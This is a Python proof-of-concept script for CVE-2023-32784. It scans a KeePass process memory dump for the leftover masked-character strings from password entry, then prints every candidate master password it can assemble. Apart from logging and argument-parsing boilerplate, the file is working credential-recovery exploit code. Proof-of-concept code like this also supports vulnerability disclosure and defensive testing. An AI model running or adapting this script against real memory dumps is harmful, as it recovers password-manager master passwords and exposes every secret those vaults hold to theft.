import argparse
import logging
import itertools


class TaggedFormatter(logging.Formatter):

    TAGS = {
        'DEBUG': '\x1b[1;35m#\x1b[0m',
        'INFO': '\x1b[1;34m.\x1b[0m',
        'WARNING': '\x1b[1;33m-\x1b[0m',
        'ERROR': '\x1b[1;31m!\x1b[0m',
        'CRITICAL': '\x1b[1;31m!!\x1b[0m'
    }

    def __init__(self, format):
        logging.Formatter.__init__(self, format)

    def format(self, record):
        levelname = record.levelname

        if levelname in self.TAGS:
            record.levelname = self.TAGS[levelname]

        return logging.Formatter.format(self, record)


def setup_logging(debug = False):
    formatter = TaggedFormatter('%(asctime)s [%(levelname)s] [%(name)s] %(message)s')
    handler = logging.StreamHandler()
    root_logger = logging.getLogger()

    handler.setFormatter(formatter)
    root_logger.addHandler(handler)

    if debug:
        root_logger.setLevel(logging.DEBUG)
    else:
        root_logger.setLevel(logging.INFO)


def parse_args():
    parser = argparse.ArgumentParser(description='CVE-2023-32784 proof-of-concept')

    parser.add_argument('dump', type=str, help='The path of the memory dump to analyze')
    parser.add_argument('-d', '--debug', dest='debug', action='store_true', help='Enable debugging mode')

    return parser.parse_args()


def get_candidates(dump_file):
    data = dump_file.read()
    candidates = []
    str_len = 0
    i = 0

    while i < len(data)-1:
        if (data[i] == 0xCF) and (data[i + 1] == 0x25):
            str_len += 1
            i += 1
        elif str_len > 0:
            if (data[i] >= 0x20) and (data[i] <= 0x7E) and (data[i + 1] == 0x00):
                candidate = (str_len * b'\xCF\x25') + bytes([data[i], data[i + 1]])

                if not candidate in candidates:
                    candidates.append(candidate)
            
            str_len = 0
        
        i += 1
    
    return candidates


if __name__ == '__main__':
    args = parse_args()
    setup_logging(args.debug)
    logger = logging.getLogger('main')

    with open(args.dump, 'rb') as dump_file:
        logger.info(f'Opened {dump_file.name}')

        candidates = get_candidates(dump_file)
        candidates = [x.decode('utf-16-le') for x in candidates]
        groups = [[] for i in range(max([len(i) for i in candidates]))]

        for candidate in candidates:
            groups[len(candidate) - 1].append(candidate[-1])
        
        for i in range(len(groups)):
            if len(groups[i]) == 0:
                groups[i].append(b'\xCF\x25'.decode('utf-16-le'))
        
        for password in itertools.product(*groups):
            password = ''.join(password)
            print(f'Possible password: {password}')
